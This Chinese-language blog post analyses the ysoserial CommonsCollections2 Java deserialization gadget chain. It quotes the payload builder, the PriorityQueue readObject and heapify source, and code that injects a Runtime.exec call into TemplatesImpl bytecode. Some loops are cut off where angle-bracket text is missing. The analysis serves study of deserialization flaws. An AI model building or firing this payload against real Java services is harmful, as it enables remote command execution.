### 0x00 背景
前段时间推荐一学弟好好看看Ysoserial，中间他问了我两个问题：1）queue为什么要先用两个1占位；2）PriorityQueue的queue
已经使用transient关键字修饰，为什么还能从流中反序列化queue中的元素（参见CommonsCollections2的源码）  
我之前只是看了部分分析比如drops[这篇](http://drops.wooyun.org/papers-14317.html
"这篇")，自己没有完完全全跟过相关源码。对于第一个问题，不假思索回答了“泛型类型擦除”，确切说是元素放入队列会进行比较排序，比较器要求元素类型一致，payload这么构造是为了防止序列化过程出现异常，后面通过利用反射再将修改元素。对于第二个问题，我当时没有让人信服的答案。  
这两天有时间看了源码和序列规范，真是惭愧，误人子弟了！  
在寻找答案的过程中，同事也尝试通过正向的思路去理解整个payload的构造，这个思路更加直白，感兴趣的可以看看。如果单纯想知道问题答案可以直接看0x03
问题解答
### 0x01 Gadget chain 分析
1）Gadget chain
    /*
        Gadget chain:
            ObjectInputStream.readObject()
                PriorityQueue.readObject()
                    ...
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
     */
2）CommonsCollections2的getObject
    public Queue getObject(final String command) throws Exception {
            final Object templates = Gadgets.createTemplatesImpl(command);
            // mock method name until armed
            final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
            // create queue with numbers and basic comparator
            final PriorityQueue queue = new PriorityQueue(2,new TransformingComparator(transformer));
            // stub data for replacement later
            queue.add(1);
            queue.add(1);
            // switch method called by comparator
            Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
            // switch contents of queue
            final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
            queueArray[0] = templates;
            queueArray[1] = 1;
            return queue;
        }
3）待序列化反序列化的类  
既然是正向思路，自然是从反序列化的本质出发。因此，很自然第一个问题是待序列化反序列化的类是哪一个。
    //java.util.PriorityQueue
4）它的readObject方法做了什么
    private void readObject(java.io.ObjectInputStream s)
            throws java.io.IOException, ClassNotFoundException {
            // Read in size, and any hidden stuff
            s.defaultReadObject();
            // Read in (and discard) array length
            s.readInt();
            queue = new Object[size];
            // Read in all elements.
            for (int i = 0; i siftDown-->siftDownUsingComparator
    private void heapify() {
            for (int i = (size >>> 1) - 1; i >= 0; i--)
                siftDown(i, (E) queue[i]);
        }
      private void siftDown(int k, E x) {
            if (comparator != null)
                siftDownUsingComparator(k, x);
            else
                siftDownComparable(k, x);
        }
     private void siftDownUsingComparator(int k, E x) {
            int half = size >>> 1;
            while (k  0)
                    c = queue[child = right];
                if (comparator.compare(x, (E) c)  comparator) {
            // Note: This restriction of at least one is not actually needed,
            // but continues for 1.5 compatibility
            if (initialCapacity  T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory )
                throws Exception {
            final T templates = tplClass.newInstance();
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
            clazz.makeClassInitializer().insertAfter(cmd);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            final byte[] classBytes = clazz.toBytecode();
            // inject class bytes into instance
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
            });
            // required to make TemplatesImpl happy
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
            return templates;
        }
`使用javassist修改字节码，javassist是一个使用广泛的修改字节码的库，另外还有两个常用的库是asm和cglib。`  
上面代码做了几件事：
  * 实例化一个org.apache.xalan.xsltc.trax.TemplatesImpl -- templates，其成员_bytecodes可以放置字节码；
  * 获取 StubTransletPayload( 继承org.apache.xalan.xsltc.runtime.AbstractTranslet)字节码，并插入命令执行的字节码；
  * 通过反射，设置templates私有成员变量的值，其中_bytecodes正是装载插入了执行我们执行命令的StubTransletPayload字节码。
整理一下，最重要的命令执行已经插入了，待序列化和反序列化的类已经准备...一切就绪，看看流程是怎么串起来。
8）回头看5），InvokerTransformer的transform方法将会被调用：
    public O transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
                } catch (NoSuchMethodException var4) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
                } catch (IllegalAccessException var5) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
                } catch (InvocationTargetException var6) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
                }
            }
        }